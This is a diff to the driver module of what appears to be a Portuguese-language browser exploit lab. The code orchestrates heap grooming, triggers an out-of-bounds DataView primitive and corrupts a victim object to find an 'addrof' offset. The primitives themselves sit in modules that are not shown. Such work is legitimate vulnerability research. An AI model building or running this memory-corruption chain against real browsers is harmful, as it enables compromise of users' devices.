@@ -1,5 +1,5 @@
 // js/app.mjs
-import { log, PAUSE_LAB } from './utils.mjs'; // log é exportado e usado globalmente
+import { log as appLog, PAUSE_LAB } from './utils.mjs'; // Renomeia 'log' para 'appLog' para evitar conflito se necessário
 import * as Int64Lib from './int64.mjs';
 import * as Core from './core_exploit.mjs';
 import * as Groomer from './heap_groomer.mjs';
@@ -7,10 +7,11 @@ import * as Corruptor from './victim_corruptor.mjs';
 import * as PostExploit from './post_exploit_conceptual.mjs';
 import { updateOOBConfigFromUI as updateGlobalOOBConfig} from './config.mjs';
 
+// Usar appLog para todas as chamadas de log dentro deste módulo
 const App = {
     runAllGroomingStrategies: async () => {
         const FNAME_STRAT = "App.runAllGroomingStrategies";
-        log(`--- Iniciando ${FNAME_STRAT} ---`, 'test', FNAME_STRAT);
+        appLog(`--- Iniciando ${FNAME_STRAT} ---`, 'test', FNAME_STRAT);
         updateGlobalOOBConfig();
         const spray_count_el = document.getElementById('sprayCountBase');
         const intermediate_allocs_el = document.getElementById('intermediateAllocs');
@@ -24,36 +25,49 @@ const App = {
             { victim_first: true, oob_first: false, spray_adj: 200, inter_adj: 50, name: "Vítima primeiro, Spray Maior"},
             { victim_first: false, oob_first: true, spray_adj: -100, inter_adj: -20, name: "OOB primeiro, Spray Menor"},
         ];
-        Corruptor.resetLastSuccessfulGap(); // USA FUNÇÃO PARA RESETAR
+        Corruptor.resetLastSuccessfulGap();
 
         for (const strat of strategies) {
-            if (Corruptor.getLastSuccessfulGap() !== null) { log("GAP de sucesso já encontrado. Interrompendo.", "good", FNAME_STRAT); break; }
-            log(`*** Iniciando Estratégia: ${strat.name} ***`, "critical", FNAME_STRAT);
+            if (Corruptor.getLastSuccessfulGap() !== null) {
+                appLog("GAP de sucesso já encontrado. Interrompendo estratégias adicionais.", "good", FNAME_STRAT);
+                break;
+            }
+            appLog(`*** Iniciando Estratégia: ${strat.name} ***`, "critical", FNAME_STRAT);
 
             let victimPrepared = false;
+            let currentOOBAllocationSize = Core.getOOBAllocationSize(); // Pegar o tamanho atual da config
+
             if (strat.oob_first) {
                 await Core.triggerOOB_primitive();
-                if (!Core.oob_dataview_real) { log("Falha OOB, pulando estratégia.", "error", FNAME_STRAT); continue; }
-                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, Core.getOOBAllocationSize(), intermediate_allocs + strat.inter_adj, false);
-                victimPrepared = await Groomer.prepareVictim(Core.getOOBAllocationSize());
-                if (!victimPrepared) { log("Falha ao preparar vítima após OOB primeiro, pulando.", "error", FNAME_STRAT); continue; }
+                if (!Core.oob_dataview_real) { appLog("Falha OOB, pulando estratégia.", "error", FNAME_STRAT); continue; }
+                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, false);
+                victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
             } else {
-                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, Core.getOOBAllocationSize(), intermediate_allocs + strat.inter_adj, true);
-                victimPrepared = await Groomer.prepareVictim(Core.getOOBAllocationSize());
-                if (!victimPrepared) { log("Falha ao preparar vítima antes de OOB, pulando.", "error", FNAME_STRAT); continue; }
-                await Core.triggerOOB_primitive();
-                if (!Core.oob_dataview_real) { log("Falha OOB após vítima, pulando estratégia.", "error", FNAME_STRAT); continue; }
+                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, true);
+                victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
+                // Somente ativa OOB *depois* do grooming e vítima, se a vítima foi preparada
+                if (victimPrepared) {
+                    await Core.triggerOOB_primitive();
+                    if (!Core.oob_dataview_real) { appLog("Falha OOB após vítima, pulando estratégia.", "error", FNAME_STRAT); continue; }
+                }
             }
-            // Certificar que a vítima foi realmente preparada antes de tentar corromper
+
+            if (!victimPrepared) {
+                appLog(`Falha ao preparar vítima para estratégia '${strat.name}'. Pulando corrupção.`, "error", FNAME_STRAT);
+                continue; // Pula para a próxima estratégia se a vítima não foi preparada
+            }
+            
+            // Adicionando uma verificação explícita de Groomer.victim_object
             if (!Groomer.victim_object) {
-                log("ERRO CRÍTICO: Groomer.victim_object é null antes de chamar findAndCorruptVictimFields_Iterative. Pulando estratégia.", "error", FNAME_STRAT);
-                continue;
+                 appLog(`ERRO CRÍTICO: Groomer.victim_object é null ANTES de chamar findAndCorrupt. Estratégia: '${strat.name}'. Pulando.`, "error", FNAME_STRAT);
+                 continue;
             }
+            appLog(`Vítima preparada para '${strat.name}', OOB Ativo: ${!!Core.oob_dataview_real}. Tentando corrupção...`, "info", FNAME_STRAT);
             await Corruptor.findAndCorruptVictimFields_Iterative();
-            await PAUSE_LAB(2000);
+            await PAUSE_LAB(2000); // Pausa entre estratégias
         }
-        log(`--- ${FNAME_STRAT} Concluído ---`, 'test', FNAME_STRAT);
-        if (Corruptor.getLastSuccessfulGap() === null) { log("Nenhuma estratégia resultou em GAP de sucesso.", "error", FNAME_STRAT); }
+        appLog(`--- ${FNAME_STRAT} Concluído ---`, 'test', FNAME_STRAT);
+        if (Corruptor.getLastSuccessfulGap() === null) { appLog("Nenhuma estratégia resultou em GAP de sucesso.", "error", FNAME_STRAT); }
          else {
             const addrofGapEl = document.getElementById('addrofGap');
             if (addrofGapEl) addrofGapEl.value = Corruptor.getLastSuccessfulGap();
@@ -66,9 +80,14 @@ const App = {
 
         if (!isNaN(gapVal)) {
             Corruptor.setCurrentTestGap(gapVal);
-            log(`CURRENT_TEST_GAP (teste único) atualizado para: ${Corruptor.getCurrentTestGap()} bytes.`, 'tool', 'App.Config');
+            appLog(`CURRENT_TEST_GAP (teste único) atualizado para: ${Corruptor.getCurrentTestGap()} bytes.`, 'tool', 'App.Config');
+            // Antes de chamar try_corrupt_fields_for_gap, garantir que a vítima e OOB estão prontos
+            if (!Groomer.victim_object || !Core.oob_dataview_real) {
+                appLog("ERRO: Vítima ou primitiva OOB não estão prontas para teste de GAP único. Execute os Passos 0 e 1.", "error", "App.Config");
+                return;
+            }
             Corruptor.try_corrupt_fields_for_gap(Corruptor.getCurrentTestGap());
-        } else { log("Valor de GAP inválido.", "error", "App.Config"); }
+        } else { appLog("Valor de GAP inválido.", "error", "App.Config"); }
     },
 
     setupUIEventListeners: () => {
@@ -77,7 +96,8 @@ const App = {
             moduleTestButtonsContainer.innerHTML = '';
             const btnTestInt64 = document.createElement('button');
             btnTestInt64.textContent = 'Testar Módulo Int64';
-            btnTestInt64.onclick = () => Int64Lib.testModule(log); // <<< Passa a função 'log' global
+            // Passar a função appLog (que é o log importado de utils.mjs) para testModule
+            btnTestInt64.onclick = () => Int64Lib.testModule(appLog);
             moduleTestButtonsContainer.appendChild(btnTestInt64);
 
             const btnTestUtils = document.createElement('button');
@@ -113,7 +133,7 @@ const App = {
     initialize: () => {
         updateGlobalOOBConfig();
         App.setupUIEventListeners();
-        log("Laboratório Modularizado (v2.8.1 - Correções Finais) pronto para testes.", "good", "App.Init");
+        appLog("Laboratório Modularizado (v2.8.2 - Correções Loop e Log) pronto para testes.", "good", "App.Init");
 
         const addrofGapEl = document.getElementById('addrofGap');
         if (addrofGapEl && Corruptor.getLastSuccessfulGap() !== null) {
@@ -128,4 +148,4 @@ if (document.readyState === 'loading') {
     App.initialize();
 }
 
-log("app.mjs carregado e pronto.", "info", "Global");
+appLog("app.mjs carregado e pronto.", "info", "Global");
